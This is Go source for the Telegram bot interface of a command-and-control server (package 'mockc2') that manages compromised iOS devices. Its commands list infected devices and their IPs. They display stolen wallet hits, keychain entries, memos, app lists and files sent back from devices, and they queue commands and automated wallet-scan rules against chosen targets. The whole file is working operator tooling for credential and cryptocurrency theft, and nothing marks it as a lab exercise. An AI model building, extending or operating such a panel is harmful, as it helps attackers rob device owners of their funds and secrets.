package telegram

import (
	"encoding/json"
	"fmt"
	"strconv"
	"strings"

	"mockc2/internal/orchestrator"
	"mockc2/internal/store"
)

// dispatch 命令分发（命令版前端：镜像网页后台各视图）。
func (b *Bot) dispatch(cmd string, args []string) string {
	switch cmd {
	case "/start", "/help":
		return b.cmdHelp()
	case "/whoami":
		return b.cmdWhoami()
	case "/status":
		return b.cmdStatus()
	case "/config":
		return b.cmdConfig()
	case "/set":
		return b.cmdSet(args)
	case "/stats":
		return cmdStats()
	case "/devices":
		return cmdDevices(args)
	case "/device":
		return cmdDevice(args)
	case "/wallets":
		return cmdWallets(args)
	case "/keychain":
		return cmdKeychain(args)
	case "/memos":
		return cmdMemos(args)
	case "/apps":
		return cmdApps(args)
	case "/results":
		return cmdResults(args)
	case "/progress":
		return cmdProgress()
	case "/access":
		return cmdAccess(args)
	case "/commands":
		return cmdCommands(args)
	case "/peek":
		return cmdPeek()
	case "/ai":
		return "" // 由 handleUpdate 统一走 askAI（此处占位，实际不走到）
	case "/rule":
		return b.cmdRule(args)
	case "/arm":
		return b.cmdArm(args)
	case "/clear":
		return b.cmdClear(args)
	default:
		return "未知命令。发送 /help 查看可用命令。"
	}
}

func (b *Bot) cmdHelp() string {
	st := b.snapshot()
	var s strings.Builder
	s.WriteString("Mock C2 · 命令版前端\n\n")
	s.WriteString("运营：\n")
	s.WriteString("/stats           全域 KPI（仪表台）\n")
	s.WriteString("/devices [n]     设备列表\n")
	s.WriteString("/device <uuid|ip> 设备详情（资产/钱包/回传文件）\n")
	s.WriteString("/progress        交付进度\n")
	s.WriteString("/access [n]      访问统计\n")
	s.WriteString("数据：\n")
	s.WriteString("/wallets [n]     钱包战果\n")
	s.WriteString("/keychain [n]    钥匙串条目\n")
	s.WriteString("/memos [n]       备忘录\n")
	s.WriteString("/apps [n]        应用资产\n")
	s.WriteString("/results [n]     指令结果\n")
	s.WriteString("/commands [n]    指令历史\n")
	s.WriteString("指令：\n")
	s.WriteString("/peek            当前武装指令 + 各设备队列\n")
	if st.AllowControl {
		s.WriteString("/arm <target> <type> [json]  按设备武装\n")
		s.WriteString("/clear [target]  清空（缺省=全局队列）\n")
	} else {
		s.WriteString("（控制类命令已关闭；/set allow_control true 开启）\n")
	}
	s.WriteString("AI：\n")
	fmt.Fprintf(&s, "直接发自然语言 → 大模型接管（llm.enabled=%v）\n", st.LLM.Enabled)
	s.WriteString("管理：\n")
	s.WriteString("/config          查看运行时配置\n")
	s.WriteString("/set <key> <value>  收紧配置\n")
	s.WriteString("/rule [list|on|off|add|del]  命令编排规则\n")
	return s.String()
}

func (b *Bot) cmdWhoami() string {
	return "你的 chat_id 已通过白名单校验。发送 /help 查看命令。"
}

func (b *Bot) cmdStatus() string {
	st := b.snapshot()
	b.mu.RLock()
	user, sent, skipped := b.username, b.sent, b.skipped
	b.mu.RUnlock()
	var s strings.Builder
	fmt.Fprintf(&s, "bot: @%s\n", user)
	fmt.Fprintf(&s, "enabled: %v · allow_control: %v\n", st.Enabled, st.AllowControl)
	fmt.Fprintf(&s, "会话白名单: %d · 通知事件: %s\n", len(st.ChatIDs), strings.Join(st.Events, ","))
	fmt.Fprintf(&s, "AI: %v (%s)\n", st.LLM.Enabled, st.LLM.Model)
	fmt.Fprintf(&s, "已推送: %d · 丢弃: %d · 队列: %d\n", sent, skipped, len(b.notifyCh))
	if e := b.getErr(); e != "" {
		fmt.Fprintf(&s, "最近错误: %s\n", e)
	}
	return strings.TrimRight(s.String(), "\n")
}

func (b *Bot) cmdConfig() string {
	st := b.snapshot()
	c := st.Config
	var s strings.Builder
	fmt.Fprintf(&s, "enabled=%v\n", c.Enabled)
	fmt.Fprintf(&s, "allow_control=%v\n", c.AllowControl)
	fmt.Fprintf(&s, "events=%s\n", strings.Join(c.Events, ","))
	fmt.Fprintf(&s, "chat_ids=%s\n", strings.Join(c.ChatIDs, ","))
	fmt.Fprintf(&s, "poll_timeout=%d rate_ms=%d\n", c.PollTimeout, c.RateMs)
	fmt.Fprintf(&s, "llm.enabled=%v\n", c.LLM.Enabled)
	fmt.Fprintf(&s, "llm.base_url=%s\n", c.LLM.BaseURL)
	fmt.Fprintf(&s, "llm.model=%s\n", c.LLM.Model)
	fmt.Fprintf(&s, "llm.api_key=%s\n", maskSecret(c.LLM.APIKey))
	fmt.Fprintf(&s, "bot_token=%s\n", maskSecret(c.BotToken))
	return strings.TrimRight(s.String(), "\n")
}

func (b *Bot) cmdSet(args []string) string {
	if len(args) < 2 {
		return "用法: /set <key> <value>\n键: enabled allow_control events chat_ids llm_enabled llm_base_url llm_model llm_api_key llm_system"
	}
	key := strings.ToLower(args[0])
	val := strings.Join(args[1:], " ")
	cur := b.snapshot().Config
	switch key {
	case "enabled":
		cur.Enabled = parseBool(val)
	case "allow_control":
		cur.AllowControl = parseBool(val)
	case "events":
		cur.Events = splitList(val)
	case "chat_ids":
		cur.ChatIDs = splitList(val)
	case "llm_enabled":
		cur.LLM.Enabled = parseBool(val)
	case "llm_base_url":
		cur.LLM.BaseURL = val
	case "llm_model":
		cur.LLM.Model = val
	case "llm_api_key":
		cur.LLM.APIKey = val
	case "llm_system":
		cur.LLM.System = val
	default:
		return "未知键: " + key
	}
	if err := saveRuntime(cur); err != nil {
		return "保存失败: " + err.Error()
	}
	b.setState(cur)
	return "已更新 " + key
}

// ── 运营 ──

func cmdStats() string {
	st := store.AggStats()
	var s strings.Builder
	s.WriteString("全域 KPI\n")
	fmt.Fprintf(&s, "设备: %d（在线 %d）\n", store.ToInt(st["devices"]), store.ToInt(st["online"]))
	fmt.Fprintf(&s, "来访: %d（今日 +%d）\n", store.ToInt(st["visits"]), store.ToInt(st["visits_today"]))
	fmt.Fprintf(&s, "备忘录: %d · war: %d · App 包: %d\n",
		store.ToInt(st["notes"]), store.ToInt(st["war"]), store.ToInt(st["apps_pkg"]))
	if counts, ok := st["counts"].(map[string]any); ok && len(counts) > 0 {
		parts := make([]string, 0, len(counts))
		for k, v := range counts {
			parts = append(parts, fmt.Sprintf("%s=%v", k, v))
		}
		s.WriteString("端点计数: " + strings.Join(parts, " ") + "\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdDevices(args []string) string {
	n := parseLimit(args, 10)
	res := store.ListDevicesPaged(1, n, "", "all")
	devs := asRows(res["devices"])
	var s strings.Builder
	fmt.Fprintf(&s, "设备列表（共 %v 台，显示 %d）\n", res["total"], len(devs))
	for _, d := range devs {
		online := "○"
		if b, _ := d["online"].(bool); b {
			online = "◉"
		}
		name := store.ToStr(d["deviceName"])
		if name == "" {
			name = store.ToStr(d["machine"])
		}
		fmt.Fprintf(&s, "%s %s\n", online, clip(store.ToStr(d["uuid"]), 22))
		fmt.Fprintf(&s, "   %s · iOS %s · %s\n", orDash(name),
			orDash(store.ToStr(d["ios"])), orDash(store.ToStr(d["ip"])))
	}
	if len(devs) == 0 {
		s.WriteString("（暂无设备）\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdDevice(args []string) string {
	if len(args) < 1 || strings.TrimSpace(args[0]) == "" {
		return "用法: /device <uuid|ip>"
	}
	id := args[0]
	d := findDevice(id)
	if d == nil {
		return "未找到设备: " + id
	}
	uuid := store.ToStr(d["uuid"])
	assets := store.DeviceAssets(uuid)
	var s strings.Builder
	online := "○ 离线"
	if b, _ := d["online"].(bool); b {
		online = "◉ 在线"
	}
	fmt.Fprintf(&s, "设备详情\n%s\n", online)
	fmt.Fprintf(&s, "uuid: %s\n", uuid)
	fmt.Fprintf(&s, "设备名: %s\n", orDash(store.ToStr(d["deviceName"])))
	fmt.Fprintf(&s, "机型: %s · iOS %s\n", orDash(store.ToStr(d["machine"])), orDash(store.ToStr(d["ios"])))
	fmt.Fprintf(&s, "IP: %s\n", orDash(store.ToStr(d["ip"])))
	fmt.Fprintf(&s, "资产: 备忘录 %v · 应用 %v · 钥匙串 %v\n",
		assets["notes_count"], assets["apps_count"], assets["war_count"])
	if names, ok := assets["wallet_names"].([]string); ok && len(names) > 0 {
		fmt.Fprintf(&s, "钱包: %s\n", strings.Join(names, ", "))
	}
	if wf := asRows(assets["war_files"]); len(wf) > 0 {
		s.WriteString("回传文件:\n")
		for i, f := range wf {
			if i >= 10 {
				break
			}
			fmt.Fprintf(&s, "· %s (%s) %s\n", store.ToStr(f["file"]),
				humanSize(int(store.ToInt(f["size"]))), store.ToStr(f["ts"]))
		}
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdProgress() string {
	cps := store.StageCheckpointsJSON()
	rows := store.StageProgressRows()
	var s strings.Builder
	s.WriteString("交付进度\n阶段权重: ")
	for _, c := range cps {
		fmt.Fprintf(&s, "%s=%v%% ", store.ToStr(c["stage"]), c["percent"])
	}
	fmt.Fprintf(&s, "\n设备进度行: %d\n", len(rows))
	for i, r := range rows {
		if i >= 10 {
			break
		}
		fmt.Fprintf(&s, "· %s  %v%%  %s\n", orDash(store.ToStr(r["ip"])), r["pct"], store.ToStr(r["stage"]))
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdAccess(args []string) string {
	n := parseLimit(args, 15)
	rows := store.GetDB().Query(
		"SELECT ts, method, path, client, status, cost_ms FROM access_log"+
			" ORDER BY ts_epoch DESC LIMIT ?", n)
	var s strings.Builder
	fmt.Fprintf(&s, "访问审计（最近 %d）\n", len(rows))
	for _, r := range rows {
		fmt.Fprintf(&s, "· %s %s %s %v %vms\n", store.ToStr(r["ts"]),
			store.ToStr(r["method"]), clip(store.ToStr(r["path"]), 40),
			r["status"], r["cost_ms"])
	}
	if len(rows) == 0 {
		s.WriteString("（暂无）\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

// ── 数据 ──

func cmdWallets(args []string) string {
	n := parseLimit(args, 10)
	rows := store.Summary("", n)
	var s strings.Builder
	fmt.Fprintf(&s, "钱包战果（Top %d）\n", len(rows))
	for _, r := range rows {
		rule := store.ToStr(r["rule_name"])
		fmt.Fprintf(&s, "· %s ×%v  %s\n", store.Display(rule), r["count"], orDash(store.ToStr(r["last_ts"])))
	}
	if len(rows) == 0 {
		s.WriteString("（暂无命中）\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdKeychain(args []string) string {
	n := parseLimit(args, 10)
	res := store.ListKeychainItems("", "", "", "", 1, n)
	rows := asRows(res["rows"])
	var s strings.Builder
	fmt.Fprintf(&s, "钥匙串条目（共 %v，显示 %d）\n", res["total"], len(rows))
	for _, r := range rows {
		fmt.Fprintf(&s, "· [%s] %s / %s\n", store.ToStr(r["tbl"]),
			orDash(store.ToStr(r["service"])), orDash(store.ToStr(r["account"])))
	}
	if len(rows) == 0 {
		s.WriteString("（暂无）\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdMemos(args []string) string {
	n := parseLimit(args, 10)
	res := store.ListMemos("", 1, n)
	rows := asRows(res["rows"])
	var s strings.Builder
	fmt.Fprintf(&s, "备忘录（共 %v，显示 %d）\n", res["total"], len(rows))
	for _, r := range rows {
		fmt.Fprintf(&s, "· %s\n  %s\n", orDash(store.ToStr(r["title"])), clip(store.ToStr(r["snippet"]), 60))
	}
	if len(rows) == 0 {
		s.WriteString("（暂无）\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdApps(args []string) string {
	n := parseLimit(args, 10)
	res := store.ListApps("", 1, n)
	rows := asRows(res["rows"])
	var s strings.Builder
	fmt.Fprintf(&s, "应用资产（共 %v，显示 %d）\n", res["total"], len(rows))
	for _, r := range rows {
		fmt.Fprintf(&s, "· %s\n", orDash(store.ToStr(r["bundleId"])))
	}
	if len(rows) == 0 {
		s.WriteString("（暂无）\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdResults(args []string) string {
	n := parseLimit(args, 10)
	res := store.ListResultData("", 1, n)
	rows := asRows(res["rows"])
	var s strings.Builder
	fmt.Fprintf(&s, "指令结果（共 %v，显示 %d）\n", res["total"], len(rows))
	for _, r := range rows {
		fmt.Fprintf(&s, "· %s %s %s\n", orDash(store.ToStr(r["command_id"])),
			orDash(store.ToStr(r["filename"])), orDash(store.ToStr(r["recv_ts"])))
	}
	if len(rows) == 0 {
		s.WriteString("（暂无）\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

func cmdCommands(args []string) string {
	n := parseLimit(args, 10)
	rows := store.CommandRecent(n)
	var s strings.Builder
	fmt.Fprintf(&s, "指令历史（最近 %d）\n", len(rows))
	for _, r := range rows {
		fmt.Fprintf(&s, "· %s %s [%s] %s\n", store.ToStr(r["command_id"]),
			store.ToStr(r["cmd_type"]), store.ToStr(r["state"]), orDash(store.ToStr(r["client_ip"])))
	}
	if len(rows) == 0 {
		s.WriteString("（暂无）\n")
	}
	return strings.TrimRight(s.String(), "\n")
}

// ── 指令控制 ──

func cmdPeek() string {
	q := store.GetQueue()
	var s strings.Builder
	s.WriteString("当前武装指令\n")
	if cur := q.Current(); cur == nil {
		s.WriteString("（全局队列空）\n")
	} else {
		b, _ := json.Marshal(cur)
		fmt.Fprintf(&s, "%s\n", string(b))
	}
	targets := q.ListTargets()
	fmt.Fprintf(&s, "按设备队列: %d 台\n", len(targets))
	for i, t := range targets {
		if i >= 15 {
			break
		}
		fmt.Fprintf(&s, "· %s 待发=%v 已发=%v\n", store.ToStr(t["target"]), t["armed"], t["dispatched"])
	}
	return strings.TrimRight(s.String(), "\n")
}

func (b *Bot) cmdArm(args []string) string {
	if !b.snapshot().AllowControl {
		return "控制类命令已关闭（/set allow_control true 开启）。"
	}
	if len(args) < 2 {
		return "用法: /arm <target> <type> [json]\ntarget 为设备 uuid 或 IP。"
	}
	target, cmdType := args[0], args[1]
	if strings.EqualFold(cmdType, "exit") {
		return "拒绝：exit 会终止设备端 beacon 循环且不可恢复，禁止通过 bot 下发。"
	}
	params := map[string]any{}
	if len(args) >= 3 {
		if err := json.Unmarshal([]byte(strings.Join(args[2:], " ")), &params); err != nil {
			return "params JSON 解析失败: " + err.Error()
		}
	}
	cmd := store.GetQueue().SetFor(target, cmdType, params, true, "", "")
	store.GetStore().WriteJSONL("control.jsonl", map[string]any{
		"action": "arm_bot", "target": target, "type": cmdType, "cmd": cmd})
	return fmt.Sprintf("已武装\n目标: %s\n类型: %s\ncommand_id: %s",
		target, cmdType, store.ToStr(cmd["command_id"]))
}

func (b *Bot) cmdClear(args []string) string {
	if !b.snapshot().AllowControl {
		return "控制类命令已关闭（/set allow_control true 开启）。"
	}
	q := store.GetQueue()
	if len(args) >= 1 && strings.TrimSpace(args[0]) != "" {
		t := args[0]
		n := q.ClearFor(t)
		return fmt.Sprintf("已取消 %s 的待发指令（%d 条）", t, n)
	}
	q.Clear()
	return "已清空全局队列。"
}

// ── 命令编排（遥控器）──

func (b *Bot) cmdRule(args []string) string {
	if len(args) == 0 || args[0] == "list" {
		rules := orchestrator.ListRules()
		if len(rules) == 0 {
			return "暂无编排规则。用 /rule add <json> 添加。"
		}
		var s strings.Builder
		fmt.Fprintf(&s, "编排规则（%d）\n", len(rules))
		for _, r := range rules {
			state := "off"
			if r.Enabled {
				state = "on"
			}
			done, sched := orchestrator.RuleState(r.Name)
			fmt.Fprintf(&s, "· [%s] %s  on=%s delay=%ds wallet=%v repeat=%s\n",
				state, r.Name, strings.Join(r.On, ","), r.DelaySec, r.RequireWallet, r.Repeat)
			fmt.Fprintf(&s, "   动作 %s once=%v · 已终态 %d · 在途 %d\n", r.Action.Type, r.Action.Once, done, sched)
		}
		return strings.TrimRight(s.String(), "\n")
	}
	switch args[0] {
	case "on", "off":
		if len(args) < 2 {
			return "用法: /rule on|off <name>"
		}
		if err := orchestrator.SetRuleEnabled(args[1], args[0] == "on"); err != nil {
			return "失败: " + err.Error()
		}
		return "已" + args[0] + " " + args[1]
	case "reset":
		if len(args) < 2 {
			return "用法: /rule reset <name> [target]"
		}
		target := ""
		if len(args) >= 3 {
			target = args[2]
		}
		n := orchestrator.ResetRule(args[1], target)
		return fmt.Sprintf("已复位 %s（清除 %d 个设备状态，可再次触发）", args[1], n)
	case "add":
		if len(args) < 2 {
			return "用法: /rule add {\"name\":\"...\",\"enabled\":true,\"on\":[\"beacon\"],\"require_wallet\":true,\"delay_sec\":180,\"cooldown_sec\":600,\"repeat\":\"once\",\"action\":{\"type\":\"wallet_scan\",\"once\":true}}"
		}
		var r orchestrator.Rule
		if err := json.Unmarshal([]byte(strings.Join(args[1:], " ")), &r); err != nil {
			return "JSON 解析失败: " + err.Error()
		}
		if err := orchestrator.AddRule(r); err != nil {
			return "失败: " + err.Error()
		}
		return "已保存规则 " + r.Name
	case "del":
		if len(args) < 2 {
			return "用法: /rule del <name>"
		}
		if err := orchestrator.DeleteRule(args[1]); err != nil {
			return "失败: " + err.Error()
		}
		return "已删除 " + args[1]
	default:
		return "用法: /rule [list|on <name>|off <name>|reset <name> [target]|add <json>|del <name>]"
	}
}

// ── 小工具 ──

// asRows 把任意 slice 值规整为 []map[string]any（store 返回可能是 []map 或 []any）。
func asRows(v any) []map[string]any {
	switch t := v.(type) {
	case []map[string]any:
		return t
	case []any:
		out := make([]map[string]any, 0, len(t))
		for _, e := range t {
			if m, ok := e.(map[string]any); ok {
				out = append(out, m)
			}
		}
		return out
	}
	return nil
}

func findDevice(id string) map[string]any {
	if id == "" {
		return nil
	}
	devs := store.ListDevices()
	for _, d := range devs {
		if store.ToStr(d["uuid"]) == id || store.ToStr(d["ip"]) == id {
			return d
		}
	}
	for _, d := range devs {
		if strings.HasPrefix(store.ToStr(d["uuid"]), id) {
			return d
		}
	}
	return nil
}

func parseLimit(args []string, def int) int {
	if len(args) > 0 {
		if v, err := strconv.Atoi(args[0]); err == nil && v > 0 && v <= 50 {
			return v
		}
	}
	return def
}

func maskSecret(s string) string {
	if s == "" {
		return "(未配置)"
	}
	if len(s) <= 6 {
		return "***"
	}
	return s[:4] + "…" + s[len(s)-2:]
}

func orDash(s string) string {
	if strings.TrimSpace(s) == "" {
		return "-"
	}
	return s
}

func clip(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}
